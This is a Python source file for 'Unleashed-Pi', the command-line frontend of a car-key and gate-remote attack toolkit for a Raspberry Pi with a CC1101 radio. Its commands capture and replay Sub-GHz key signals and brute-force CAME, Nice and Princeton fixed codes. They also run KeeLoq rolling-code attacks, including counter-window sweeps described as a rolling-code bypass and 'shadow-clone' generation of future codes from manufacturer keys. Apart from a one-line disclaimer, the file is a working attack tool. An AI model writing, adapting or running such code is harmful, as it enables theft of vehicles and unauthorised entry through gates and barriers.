#!/usr/bin/env python3
"""Unleashed-Pi — Private Unleashed 2.0 car-key hacking toolkit for Raspberry Pi 3/4/5.

Runs the same Sub-GHz attack stack as the Private Unleashed / Quantum
Flipper Zero firmware on a Raspberry Pi with a CC1101 module (the radio
chip the Flipper uses).

  read    — live-capture & decode car keys / alarms / barriers
  capture — record raw signals, save Flipper .sub files
  send    — replay any Flipper .sub (incl. the repo's vehicle packs)
  brute   — dynamic brute-force (CAME / Nice / Princeton / KeeLoq counters)
  keeloq  — hopping-code analysis, rolling-counter manipulation modes 0-7
  rssi    — frequency scanner to find active key frequencies

Usage:
  sudo python3 unleashed_pi.py                 # interactive menu
  sudo python3 unleashed_pi.py read --freq 433920000 --preset AM650
  sudo python3 unleashed_pi.py send assets/subghz/SAMPLE_CAME.sub --count 3
  python3 unleashed_pi.py info assets/subghz/SAMPLE_KeeLoq.sub   # no hw needed
  python3 unleashed_pi.py selftest                                # no hw needed

Educational / authorized testing use only — check your local laws.
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
from datetime import datetime

# make `lib` importable from anywhere
HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

from lib import __version__ as APP_VERSION  # noqa: E402
from lib import keeloq_crypto as kq  # noqa: E402
from lib.bruteforce import BruteForcer  # noqa: E402
from lib.cc1101 import CC1101, MockSPI  # noqa: E402
from lib.clone_state import CloneState  # noqa: E402
from lib.gpio_backend import GpioBackend, MockBackend, detect_backend  # noqa: E402
from lib.keeloq_tx import clone_next_subs, predicted_counters  # noqa: E402
from lib.keystore import Keystore  # noqa: E402
from lib.presets import PRESETS, default_preset, preset_by_name  # noqa: E402
from lib.protocols import (CameEncoder, KeeLoqDecoder, NiceFloEncoder,  # noqa: E402
                           PrincetonEncoder)
from lib.protocols.base import DecoderResult  # noqa: E402
from lib.rx_engine import RxEngine  # noqa: E402
from lib.subfile import SubFile  # noqa: E402
from lib.tx_engine import TxEngine  # noqa: E402
from lib.util import COMMON_FREQUENCIES, format_freq, is_tx_allowed  # noqa: E402

CONFIG_PATH = os.path.join(HERE, "config.json")
SIGNALS_DIR = os.path.join(HERE, "signals")

DEFAULT_CONFIG = {
    "spi_bus": 0,
    "spi_cs": 0,
    "gdo0_gpio": 27,
    "gdo2_gpio": 17,
    "gpio_chip": None,
    "prefer_backend": None,
    "default_frequency": 433920000,
    "default_preset": "AM650",
    "allow_extended_freq": True,
    "tx_power_dbm": 12,
    "keeloq_keys": "assets/keeloq_keys.txt",
    "repeat": 3,
}

# ---------------------------------------------------------------------------
# tiny console helpers
# ---------------------------------------------------------------------------

class C:
    enabled = sys.stdout.isatty()
    R = "\033[31m" if enabled else ""
    G = "\033[32m" if enabled else ""
    Y = "\033[33m" if enabled else ""
    B = "\033[34m" if enabled else ""
    M = "\033[35m" if enabled else ""
    C = "\033[36m" if enabled else ""
    W = "\033[1;97m" if enabled else ""
    X = "\033[0m" if enabled else ""


def info(msg): print(f"{C.C}[i]{C.X} {msg}")
def ok(msg): print(f"{C.G}[+]{C.X} {msg}")
def warn(msg): print(f"{C.Y}[!]{C.X} {msg}")
def err(msg): print(f"{C.R}[x]{C.X} {msg}")


BANNER = rf"""
{C.M}  _   _ _   _ __  _____ _   _ __  __    _    ____  _   _    _    _____ ____    _____
{C.M} | | | | | | |  \/ ( ____ | \ | |  \/  |  / \  |  _ \| | | |  / \  | ___ / ___|  / ____|
{C.M} | | | | | | | \  /| (__| |  \| | |\/| | / _ \ | |_) | | | | / _ \ | |_/ \___ \ | |
{C.M} | | | | | | | |  \ \__ \ | . ` | |  | |/ ___ \|  _ <| |_| |/ ___ \|  __/ ___) || |
{C.M} | |_| | |_| | |__) ___ | |\  | |  | / /   \ \ |_) |  _  / /   \ \ |  |____/ | |____
{C.M}  \___/ \___/|____/_____|_| \_|_|  |/_/     \_\____/|_| \_/_/     \_\_|         \_____|
{C.X}{C.C}        Private Unleashed 2.0 :: Raspberry Pi 3 / 4 / 5 Edition v{APP_VERSION}
{C.X}        car keys - alarms - barriers :: CC1101 :: KeeLoq :: Flipper .sub
{C.Y}        educational use only - test only what you own!
{C.X}"""


# ---------------------------------------------------------------------------
# app context
# ---------------------------------------------------------------------------

class App:
    def __init__(self, config: dict):
        self.config = config
        self.gpio: GpioBackend = None
        self.radio: CC1101 = None
        self.keystore = Keystore()
        self.demo_mode = False
        self.rx: RxEngine = None
        self.tx: TxEngine = None
        self.clone_state = CloneState(os.path.join(SIGNALS_DIR, "clone_state.json"))

    # -- keystore --------------------------------------------------------
    def ensure_keystore(self) -> Keystore:
        """Load the KeeLoq manufacturer keys once (also used offline)."""
        if len(self.keystore) == 0:
            keys_path = os.path.join(HERE, self.config.get("keeloq_keys", ""))
            if os.path.isfile(keys_path):
                self.keystore.load(keys_path)
        return self.keystore

    # -- hardware ------------------------------------------------------
    def open_hardware(self) -> None:
        gdo0 = int(self.config["gdo0_gpio"])
        self.gpio = detect_backend([gdo0], prefer=self.config.get("prefer_backend"),
                                    chip_hint=self.config.get("gpio_chip"))

        alive = False
        try:
            radio = CC1101(spi_bus=int(self.config["spi_bus"]),
                           spi_cs=int(self.config["spi_cs"]))
            alive = radio.check_alive()
            if alive:
                self.radio = radio
            else:
                radio.close()
        except Exception:
            alive = False

        if not alive:
            # no CC1101 on the SPI bus — use the in-memory radio so the
            # whole stack still runs end-to-end (demo mode)
            self.radio = CC1101(spi=MockSPI())

        if self.gpio.is_mock or not alive:
            self.demo_mode = True
            warn("DEMO MODE — CC1101/GPIO not detected.")
            warn("On a Pi: enable SPI (sudo raspi-config nonint do_spi 0), "
                 "wire the CC1101 module, run with sudo.")
        else:
            ok(f"CC1101 radio found (PARTNUM=0x{self.radio.get_partnum():02X} "
               f"VERSION=0x{self.radio.get_version():02X}) on "
               f"SPI{self.config['spi_bus']}.{self.config['spi_cs']}, "
               f"GPIO backend: {self.gpio.name}")

        keystore = self.ensure_keystore()
        if len(keystore):
            info(f"KeeLoq keystore: {len(keystore)} manufacturer keys loaded")

        self.rx = RxEngine(self.radio, self.gpio, gdo0, keystore=self.keystore)
        self.tx = TxEngine(self.radio, self.gpio, gdo0,
                          allow_extended=bool(self.config.get("allow_extended_freq", True)),
                          keystore=self.keystore)

    def preset(self, name: str = None) -> object:
        return preset_by_name(name or self.config["default_preset"])

    # -- signal helpers -------------------------------------------------
    def save_result(self, result: DecoderResult, directory: str = None) -> str:
        directory = directory or SIGNALS_DIR
        os.makedirs(directory, exist_ok=True)
        sub = SubFile()
        sub.frequency = int(self.rx.radio.frequency)
        sub.preset_name = self.preset().name
        sub.protocol = result.protocol_name
        sub.bit = result.data_count_bit
        sub.key = result.data
        sub.te = result.te or 0
        sub.repeat = int(self.config.get("repeat", 3))
        if result.protocol_name == "KeeLoq":
            sub.manufacture = result.manufacture_name
            sub.seed = result.seed
            sub.counter_mode = 2
        if result.protocol_name == "Princeton" and "guard_time" in result.extra:
            sub.guard_time = result.extra["guard_time"]
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        name = f"{stamp}_{result.protocol_name}_{result.data:012X}.sub"
        path = os.path.join(directory, name)
        sub.save(path)
        return path


# ---------------------------------------------------------------------------
# commands
# ---------------------------------------------------------------------------

def cmd_read(app: App, args) -> None:
    freq = args.freq or int(app.config["default_frequency"])
    preset = app.preset(args.preset)
    if not args.yes:
        print(f"\n{C.W}>>> LIVE READ{C.X}  {format_freq(freq)}  preset {preset.short}")
        print(f"{C.W}    press buttons on the target key / remote. Ctrl+C to stop.{C.X}\n")

    last_printed = {}

    def on_found(result: DecoderResult):
        key_sig = (result.protocol_name, result.data)
        now = time.monotonic()
        if last_printed.get(key_sig) and now - last_printed[key_sig] < 2.0:
            return
        last_printed[key_sig] = now
        print(f"\n{C.G}================ FOUND ================{C.X}")
        for line in result.summary().splitlines():
            print(f"{C.W}{line}{C.X}")
        if result.protocol_name == "KeeLoq" and result.manufacture_name not in \
                ("Unknown", "") and result.cnt:
            print(f"{C.Y}    rolling counter: 0x{result.cnt:04X} "
                  f"(save this — replay uses counter modes){C.X}")
            # shadow clone: keep our counter mirror in sync with the real key
            try:
                mirrored = app.clone_state.observe(result.manufacture_name,
                                                  result.serial, result.btn,
                                                  result.cnt)
                print(f"{C.C}    [shadow-clone] mirror updated -> 0x{mirrored:04X}{C.X}")
            except Exception as exc:  # noqa: BLE001
                warn(f"clone state update failed: {exc}")
        print(f"{C.G}======================================={C.X}")
        if args.save:
            path = app.save_result(result)
            ok(f"saved -> {path}")

    app.rx.start(preset, freq, on_found=on_found)
    try:
        while True:
            time.sleep(0.2)
    except KeyboardInterrupt:
        pass
    finally:
        app.rx.stop()
        info("read stopped")


def cmd_capture(app: App, args) -> None:
    freq = args.freq or int(app.config["default_frequency"])
    preset = app.preset(args.preset)
    duration = args.time or 0
    out = args.out or os.path.join(
        SIGNALS_DIR, datetime.now().strftime("%Y%m%d_%H%M%S") + "_RAW.sub")

    print(f"\n{C.W}>>> RAW CAPTURE{C.X}  {format_freq(freq)}  preset {preset.short}")
    if duration:
        print(f"    recording {duration}s ...")
    else:
        print(f"    recording ... Ctrl+C to stop")

    app.rx.start(preset, freq)
    app.rx.start_recording()
    start = time.monotonic()
    try:
        if duration:
            while time.monotonic() - start < duration:
                time.sleep(0.1)
                if args.verbose:
                    _print_rssi(app)
        else:
            while True:
                time.sleep(0.2)
    except KeyboardInterrupt:
        pass
    finally:
        levels = app.rx.stop_recording()
        app.rx.stop()

    if not levels:
        warn("nothing captured")
        return

    sub = SubFile()
    sub.filetype = "Flipper SubGhz RAW File"
    sub.frequency = freq
    sub.preset_name = preset.name
    sub.raw_data = [d if lvl else -d for lvl, d in levels]
    sub.repeat = 1
    sub.save(out)
    total_ms = sum(abs(d) for d in sub.raw_data) / 1000
    ok(f"captured {len(sub.raw_data)} samples ({total_ms:.1f} ms) -> {out}")
    info("replay with:  sudo python3 unleashed_pi.py send " + out)


def _print_rssi(app: App):
    print(f"\r    RSSI {app.rx.rssi_dbm():6.1f} dBm ", end="", flush=True)


def cmd_send(app: App, args) -> None:
    sub = SubFile.load(args.file)
    print(f"\n{C.W}>>> SEND{C.X}  {args.file}")
    for line in sub.info_lines():
        print(f"    {line}")
    freq = args.freq or sub.frequency
    if args.preset:
        sub.preset_name = preset_by_name(args.preset).name
    if args.count:
        sub.repeat = args.count
    if app.demo_mode:
        warn("DEMO MODE — pulse train generated, nothing radiated")
    count = app.tx.send_subfile(sub)
    ok(f"transmitted {count} frame(s) @ {format_freq(freq)}")


def cmd_info(app: App, args) -> None:
    app.ensure_keystore()
    for path in args.files:
        sub = SubFile.load(path)
        print(f"\n{C.W}=== {path} ==={C.X}")
        for line in sub.info_lines():
            print(f"  {line}")
        if sub.protocol == "KeeLoq" and sub.key:
            dec = KeeLoqDecoder(keystore=app.keystore)
            result = dec.make_result_from_data(sub.key)
            fix, hop = kq.split_frame(sub.key)
            btn, serial = kq.parse_fix(fix)
            print(f"  FIX    : 0x{fix:08X}   HOP: 0x{hop:08X}")
            print(f"  Btn    : 0x{btn:X}      Serial: 0x{serial:07X}")
            print(f"  MF     : {result.manufacture_name}")
            if result.cnt:
                print(f"  Counter: 0x{result.cnt:04X}")
            if result.seed:
                print(f"  Seed   : 0x{result.seed:08X}")
            if result.manufacture_name not in ("Unknown", ""):
                mf, chain = predicted_counters(sub, keystore=app.keystore,
                                               count=4)
                if chain:
                    print(f"  Next   : " + " ".join(f"0x{c:04X}" for c in chain)
                          + "  (mode "
                          + str(sub.counter_mode or 0) + ")")


def cmd_brute(app: App, args) -> None:
    freq = args.freq or int(app.config["default_frequency"])
    preset = app.preset(args.preset)

    if args.protocol in ("came", "nice", "princeton"):
        proto = {"came": "CAME", "nice": "Nice FLO", "princeton": "Princeton"}[args.protocol]
        total = args.count
        print(f"\n{C.W}>>> BRUTE FORCE {proto}{C.X}  {format_freq(freq)}  "
              f"start=0x{args.start:X} count={total}")
        print(f"{C.Y}    stand next to the gate/car — watch for it to react.{C.X}")
        if app.demo_mode:
            warn("DEMO MODE — pulses generated, nothing radiated")
        bf = BruteForcer(app.tx)
        done = [0]

        def progress(d, t):
            done[0] = d
            pct = 100.0 * d / t if t else 0
            print(f"\r    [{pct:5.1f}%] code {d}/{t}", end="", flush=True)
            return False

        sent = bf.run_codes(preset, freq, proto,
                            range(args.start, args.start + total),
                            repeat_per_code=args.repeat_per_code,
                            inter_code_gap_s=args.gap / 1000.0,
                            progress=progress)
        print()
        ok(f"sent {sent} codes")
        return

    if args.protocol == "keeloq":
        sub = SubFile.load(args.file)
        freq = args.freq or sub.frequency

        if args.sweep_from is not None or args.sweep_to is not None:
            frm = args.sweep_from if args.sweep_from is not None else 0
            to = args.sweep_to if args.sweep_to is not None else (frm + args.count - 1)
            print(f"\n{C.W}>>> KEELOQ COUNTER-WINDOW SWEEP{C.X}  {args.file}")
            print(f"    spraying re-encrypted hops for counters "
                  f"0x{frm:04X}..0x{to:04X} (step 0x{args.sweep_step:X})")
            if app.demo_mode:
                warn("DEMO MODE — pulses generated, nothing radiated")
            bf = BruteForcer(app.tx)

            def progress(d, t):
                print(f"\r    counter frame {d}/{t}", end="", flush=True)
                return False

            try:
                sent = bf.run_keeloq_sweep(app.preset(args.preset) or preset, freq,
                                          sub, app.keystore, frm, to,
                                          step=args.sweep_step, progress=progress)
                print()
                ok(f"swept {sent} counters")
            except ValueError as exc:
                err(str(exc))
            return

        print(f"\n{C.W}>>> KEELOQ COUNTER ATTACK{C.X}  {args.file}")
        print(f"    mode {args.counter_mode} "
              f"(2 = +0x3333 counter jumps), {args.count} frames")
        if app.demo_mode:
            warn("DEMO MODE — pulses generated, nothing radiated")
        bf = BruteForcer(app.tx)

        def progress(d, t):
            print(f"\r    frame {d}/{t}", end="", flush=True)
            return False

        sent = bf.run_keeloq(app.preset(args.preset) or preset, freq, sub,
                             app.keystore, count=args.count,
                             counter_mode=args.counter_mode, progress=progress)
        print()
        ok(f"sent {sent} frames with predicted counters")
        return

    err(f"unknown brute protocol {args.protocol!r} (came|nice|princeton|keeloq)")


def cmd_keeloq_decode(app: App, args) -> None:
    fix = int(args.fix, 16)
    hop = int(args.hop, 16)
    btn, serial = kq.parse_fix(fix)
    print(f"\n{C.W}>>> KEELOQ FRAME ANALYSIS{C.X}")
    print(f"  FIX    : 0x{fix:08X}   HOP: 0x{hop:08X}")
    print(f"  Btn    : 0x{btn:X}      Serial: 0x{serial:07X}")

    if args.key:
        key = int(args.key, 16)
        ltype = args.type or "simple"
        man = key
        if ltype == "normal":
            man = kq.normal_learning(fix, key)
        elif ltype == "secure":
            man = kq.secure_learning(fix, args.seed or 0, key)
        decrypt = kq.keeloq_decrypt(hop, man)
        d_btn, d_serial, d_cnt = kq.parse_decrypt(decrypt)
        print(f"  Key    : 0x{key:016X} ({ltype} learning)")
        print(f"  Decrypt: 0x{decrypt:08X}")
        print(f"           btn=0x{d_btn:X} serial10=0x{d_serial:03X} counter=0x{d_cnt:04X}")
        from lib.protocols.keeloq import next_counter
        chain = [d_cnt]
        for _ in range(3):
            chain.append(next_counter(chain[-1], 2))
        print(f"  next counters (mode 2): " +
              " ".join(f"0x{c:04X}" for c in chain[1:]))
    else:
        info("pass --key 0x... [--type simple|normal|secure] to decrypt the hop")


def cmd_clone(app: App, args) -> None:
    """Shadow-clone next-code generator."""
    sub = SubFile.load(args.file)
    app.ensure_keystore()
    mf = sub.manufacture or "Unknown"

    start_cnt = None
    if args.use_state:
        state = app.clone_state.get(mf, _serial_of(sub))
        if state and state.get("cnt"):
            start_cnt = state["cnt"]
            info(f"shadow-clone mirror start: 0x{start_cnt:04X} "
                 f"(seen {state.get('seen', 0)} frames)")
        else:
            warn("no mirror state — using the file's counter")

    clones, counters = clone_next_subs(sub, keystore=app.keystore,
                                       steps=args.steps,
                                       counter_mode=args.counter_mode,
                                       start_cnt=start_cnt)
    if not clones:
        err("no clones generated")
        return

    mode = args.counter_mode if args.counter_mode is not None else (sub.counter_mode or 2)
    print(f"\n{C.W}>>> SHADOW CLONE{C.X}  {args.file}")
    print(f"    {len(clones)} future codes (mode {mode})")
    if clones[0].manufacture == "Unknown":
        warn("manufacturer unknown — codes replay the captured hop (no increment)")
    else:
        print(f"    counters: " + " ".join(f"0x{c:04X}" for c in counters))

    if args.outdir:
        os.makedirs(args.outdir, exist_ok=True)
        for i, clone in enumerate(clones, 1):
            path = os.path.join(args.outdir,
                                f"clone_{_serial_of(sub):07X}_plus{i}.sub")
            clone.save(path)
            ok(f"saved -> {path}")

    if args.transmit:
        if app.demo_mode:
            warn("DEMO MODE — pulses generated, nothing radiated")
        sent = 0
        for clone in clones:
            sent += app.tx.send_subfile(clone)
        ok(f"transmitted {sent} clone frame(s)")

    # advance the mirror to the last generated counter
    if clones[-1].manufacture != "Unknown":
        app.clone_state.advance(clones[-1].manufacture, _serial_of(clones[-1]),
                                counters[-1])
        info("mirror advanced. next capture re-syncs it automatically.")


def _serial_of(sub) -> int:
    fix, _hop = kq.split_frame(sub.key & 0xFFFFFFFFFFFFFFFF)
    return fix & 0x0FFFFFFF


def cmd_rssi(app: App, args) -> None:
    from lib.util import DEFAULT_TX_RANGES, EXTENDED_RANGES
    freq = args.freq or int(app.config["default_frequency"])
    step = args.step or 100_000
    preset = app.preset(args.preset)

    ranges = EXTENDED_RANGES if args.extended else DEFAULT_TX_RANGES
    print(f"\n{C.W}>>> RSSI SCAN{C.X}")
    for lo, hi in ranges:
        f = max(lo, freq - args.span)
        end = min(hi, freq + args.span)
        while f <= end:
            app.radio.load_preset(preset)
            app.radio.set_frequency(f)
            app.radio.start_rx()
            time.sleep(0.05)
            dbm = app.radio.get_rssi_dbm()
            if dbm > args.threshold:
                bar = "#" * int((dbm + 100) / 3)
                print(f"  {f / 1e6:9.3f} MHz  {dbm:6.1f} dBm {bar}")
            f += step
        app.radio.idle()
    ok("scan done")


def cmd_presets(app: App, args) -> None:
    print(f"\n{C.W}>>> RADIO PRESETS (firmware-exact CC1101 configs){C.X}")
    for p in PRESETS.values():
        print(f"  {C.C}{p.short:7s}{C.X} {p.name:38s} {p.modulation}")
    info("use with --preset AM650|AM270|FM238|FM476|FM120|MSK99|GFSK9")


def cmd_selftest(app: App, args) -> None:
    from tests_selftest import run_selftest
    run_selftest(verbose=not args.quiet)


def cmd_config(app: App, args) -> None:
    if args.get:
        print(f"{args.get} = {app.config.get(args.get, '<unset>')}")
    elif args.set:
        key, _, value = args.set.partition("=")
        key = key.strip()
        try:
            value = json.loads(value)
        except json.JSONDecodeError:
            pass
        app.config[key] = value
        save_config(app.config)
        ok(f"{key} = {value}")
    else:
        print(json.dumps(app.config, indent=2))


# ---------------------------------------------------------------------------
# interactive menu
# ---------------------------------------------------------------------------

def menu(app: App) -> None:
    print(BANNER)
    if app.demo_mode:
        warn("running in DEMO MODE (no radio). See README for wiring.")
    while True:
        print(f"""
{C.W}  [1] Read        live-capture & decode keys (Sub-GHz RX)
{C.X}  [2] Capture     record RAW signal -> Flipper .sub
  [3] Send        replay a saved .sub signal
  [4] Brute force CAME / Nice / Princeton / KeeLoq counters
  [c] Clone       shadow-clone: pre-compute future rolling codes
  [5] KeeLoq lab  decode fix/hop, predict counters
  [6] RSSI scan    find active frequencies
  [7] Info         inspect .sub file(s)
  [8] Presets      radio preset list
  [9] Config       show / change settings
  [s] Selftest     verify the whole stack
  [0] Exit""")
        try:
            choice = input(f"{C.C}unleashed-pi>{C.X} ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            break

        try:
            if choice == "1":
                class A: pass
                a = A(); a.freq = None; a.preset = None; a.save = True; a.yes = False
                cmd_read(app, a)
            elif choice == "2":
                class A: pass
                a = A(); a.freq = None; a.preset = None; a.time = 0; a.out = None; a.verbose = True
                cmd_capture(app, a)
            elif choice == "3":
                path = _pick_sub()
                if path:
                    class A: pass
                    a = A(); a.file = path; a.count = None; a.freq = None; a.preset = None
                    cmd_send(app, a)
            elif choice == "4":
                _menu_brute(app)
            elif choice == "c":
                path = _pick_sub()
                if path:
                    class A: pass
                    a = A(); a.file = path; a.steps = 4; a.counter_mode = None
                    a.use_state = True; a.outdir = SIGNALS_DIR; a.transmit = False
                    cmd_clone(app, a)
            elif choice == "5":
                fix = input("fix  hex (e.g. 1A2B3C4D): ").strip() or "1A2B3C4D"
                hop = input("hop  hex (e.g. 5E6F7A8B): ").strip() or "5E6F7A8B"
                key = input("mf key hex (blank=skip): ").strip() or None
                class A: pass
                a = A(); a.fix = fix; a.hop = hop; a.key = key; a.type = "simple"; a.seed = 0
                cmd_keeloq_decode(app, a)
            elif choice == "6":
                class A: pass
                a = A(); a.freq = None; a.preset = None; a.step = None; a.span = 5_000_000
                a.threshold = -80; a.extended = False
                cmd_rssi(app, a)
            elif choice == "7":
                path = _pick_sub()
                if path:
                    class A: pass
                    a = A(); a.files = [path]
                    cmd_info(app, a)
            elif choice == "8":
                cmd_presets(app, None)
            elif choice == "9":
                cmd_config(app, type("A", (), {"get": None, "set": None})())
            elif choice == "s":
                cmd_selftest(app, type("A", (), {"quiet": False})())
            elif choice == "0":
                break
        except KeyboardInterrupt:
            print()
        except Exception as exc:  # noqa: BLE001
            err(f"{type(exc).__name__}: {exc}")


def _menu_brute(app: App) -> None:
    print(f"""
  brute force target:
  [1] CAME 12-bit      (4096 codes, ~ gates/barriers)
  [2] Nice FLO 12-bit  (4096 codes)
  [3] Princeton 24-bit (enter start/count)
  [4] KeeLoq counter attack (needs captured .sub)
  [5] KeeLoq counter-window sweep (strong rolling-code bypass)""")
    choice = input("select> ").strip()
    class A: pass
    a = A(); a.freq = None; a.preset = None; a.repeat_per_code = 1; a.gap = 4
    a.sweep_from = None; a.sweep_to = None; a.sweep_step = 1
    if choice == "1":
        a.protocol = "came"; a.start = 0; a.count = 4096
    elif choice == "2":
        a.protocol = "nice"; a.start = 0; a.count = 4096
    elif choice == "3":
        a.protocol = "princeton"
        a.start = int(input("start code hex: ") or "0", 16)
        a.count = int(input("count: ") or "4096")
    elif choice == "4":
        a.protocol = "keeloq"
        a.file = _pick_sub() or ""
        a.count = int(input("frames (default 12): ") or "12")
        a.counter_mode = int(input("counter mode 0-7 (default 2): ") or "2")
    elif choice == "5":
        a.protocol = "keeloq"
        a.file = _pick_sub() or ""
        a.sweep_from = int(input("sweep from counter hex (blank=0): ") or "0", 16)
        span = int(input("how many counters (default 64): ") or "64")
        a.sweep_to = (a.sweep_from + span - 1) & 0xFFFF
        step = input("step hex (default 1, 0x3333 for jumps): ").strip()
        a.sweep_step = int(step, 16) if step else 1
    else:
        return
    if getattr(a, "protocol", None):
        cmd_brute(app, a)


def _pick_sub() -> str:
    files = []
    for base in (SIGNALS_DIR, os.path.join(HERE, "assets", "subghz")):
        if os.path.isdir(base):
            files += [os.path.join(base, f) for f in sorted(os.listdir(base))
                     if f.endswith(".sub")]
    if not files:
        warn("no .sub files found (capture one first)")
        return ""
    print("\n  signals:")
    for i, f in enumerate(files, 1):
        print(f"   [{i}] {os.path.relpath(f, HERE)}")
    raw = input("  number or path (blank=cancel): ").strip()
    if not raw:
        return ""
    if raw.isdigit() and 1 <= int(raw) <= len(files):
        return files[int(raw) - 1]
    return raw if os.path.isfile(raw) else ""


# ---------------------------------------------------------------------------
# config
# ---------------------------------------------------------------------------

def load_config() -> dict:
    cfg = dict(DEFAULT_CONFIG)
    if os.path.isfile(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r", encoding="utf-8") as fh:
                cfg.update(json.load(fh))
        except Exception as exc:  # noqa: BLE001
            warn(f"config.json unreadable ({exc}); using defaults")
    return cfg


def save_config(cfg: dict) -> None:
    with open(CONFIG_PATH, "w", encoding="utf-8") as fh:
        json.dump(cfg, fh, indent=2)


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="unleashed_pi.py",
        description="Unleashed-Pi — car-key Sub-GHz toolkit for Raspberry Pi 3/4/5")
    sub = p.add_subparsers(dest="cmd")

    sp = sub.add_parser("read", help="live-capture & decode signals")
    sp.add_argument("--freq", type=lambda v: int(float(v) * 1e6) if "." in v else int(v))
    sp.add_argument("--preset", choices=list(PRESETS))
    sp.add_argument("--save", action="store_true", help="save each decode to signals/")
    sp.add_argument("-y", "--yes", action="store_true")

    sp = sub.add_parser("capture", help="record RAW signal to .sub")
    sp.add_argument("--freq", type=lambda v: int(float(v) * 1e6) if "." in v else int(v))
    sp.add_argument("--preset", choices=list(PRESETS))
    sp.add_argument("-t", "--time", type=int, help="seconds (Ctrl+C otherwise)")
    sp.add_argument("--out")
    sp.add_argument("-v", "--verbose", action="store_true")

    sp = sub.add_parser("send", help="replay a .sub file")
    sp.add_argument("file")
    sp.add_argument("--count", type=int, help="repeat count override")
    sp.add_argument("--freq", type=lambda v: int(float(v) * 1e6) if "." in v else int(v))
    sp.add_argument("--preset", choices=list(PRESETS))

    sp = sub.add_parser("info", help="inspect .sub file(s)")
    sp.add_argument("files", nargs="+")

    sp = sub.add_parser("brute", help="brute force / counter attack")
    sp.add_argument("protocol", choices=["came", "nice", "princeton", "keeloq"])
    sp.add_argument("--start", type=lambda v: int(v, 0), default=0)
    sp.add_argument("--count", type=int, default=4096)
    sp.add_argument("--repeat-per-code", type=int, default=1)
    sp.add_argument("--gap", type=int, default=4, help="ms between codes")
    sp.add_argument("--freq", type=lambda v: int(float(v) * 1e6) if "." in v else int(v))
    sp.add_argument("--preset", choices=list(PRESETS))
    sp.add_argument("--file", help="captured KeeLoq .sub (for protocol keeloq)")
    sp.add_argument("--counter-mode", type=int, default=2, choices=list(range(8)))
    sp.add_argument("--sweep-from", type=lambda v: int(v, 0), default=None,
                    help="counter-window sweep: first counter (hex ok)")
    sp.add_argument("--sweep-to", type=lambda v: int(v, 0), default=None,
                    help="counter-window sweep: last counter")
    sp.add_argument("--sweep-step", type=lambda v: int(v, 0), default=1,
                    help="counter step (e.g. 0x3333)")

    sp = sub.add_parser("clone", help="shadow-clone: pre-compute future codes")
    sp.add_argument("file", help="captured KeeLoq .sub")
    sp.add_argument("--steps", type=int, default=4, help="how many future codes")
    sp.add_argument("--counter-mode", type=int, default=None, choices=list(range(8)),
                    help="counter mode (default: file's CounterMode or 2)")
    sp.add_argument("--use-state", action="store_true",
                    help="start from the shadow-clone mirror counter")
    sp.add_argument("--outdir", help="save each future code as a .sub here")
    sp.add_argument("--transmit", action="store_true", help="send them right away")

    sp = sub.add_parser("keeloq-decode", help="analyze fix/hop pair")
    sp.add_argument("--fix", required=True)
    sp.add_argument("--hop", required=True)
    sp.add_argument("--key", help="64-bit manufacturer key hex")
    sp.add_argument("--type", choices=["simple", "normal", "secure"], default="simple")
    sp.add_argument("--seed", type=lambda v: int(v, 0), default=0)

    sp = sub.add_parser("rssi", help="frequency scanner")
    sp.add_argument("--freq", type=lambda v: int(float(v) * 1e6) if "." in v else int(v))
    sp.add_argument("--preset", choices=list(PRESETS))
    sp.add_argument("--step", type=int, help="Hz per step (default 100k)")
    sp.add_argument("--span", type=int, default=2_000_000)
    sp.add_argument("--threshold", type=float, default=-80.0)
    sp.add_argument("--extended", action="store_true")

    sub.add_parser("presets", help="list radio presets")
    sp = sub.add_parser("selftest", help="verify the stack (no hardware needed)")
    sp.add_argument("-q", "--quiet", action="store_true")

    sp = sub.add_parser("config", help="show/change config")
    sp.add_argument("--get")
    sp.add_argument("--set", dest="set", metavar="KEY=VALUE")

    sub.add_parser("menu", help="interactive menu (default)")
    return p


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)
    config = load_config()
    app = App(config)

    needs_hw = args.cmd in ("read", "capture", "send", "brute", "rssi", "clone") or args.cmd is None
    if needs_hw:
        app.open_hardware()

    try:
        if args.cmd is None or args.cmd == "menu":
            menu(app)
        elif args.cmd == "read":
            cmd_read(app, args)
        elif args.cmd == "capture":
            cmd_capture(app, args)
        elif args.cmd == "send":
            cmd_send(app, args)
        elif args.cmd == "info":
            cmd_info(app, args)
        elif args.cmd == "brute":
            cmd_brute(app, args)
        elif args.cmd == "clone":
            cmd_clone(app, args)
        elif args.cmd == "keeloq-decode":
            cmd_keeloq_decode(app, args)
        elif args.cmd == "rssi":
            cmd_rssi(app, args)
        elif args.cmd == "presets":
            cmd_presets(app, args)
        elif args.cmd == "selftest":
            cmd_selftest(app, args)
        elif args.cmd == "config":
            cmd_config(app, args)
    finally:
        if app.gpio is not None:
            app.gpio.close()
        if app.radio is not None:
            app.radio.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
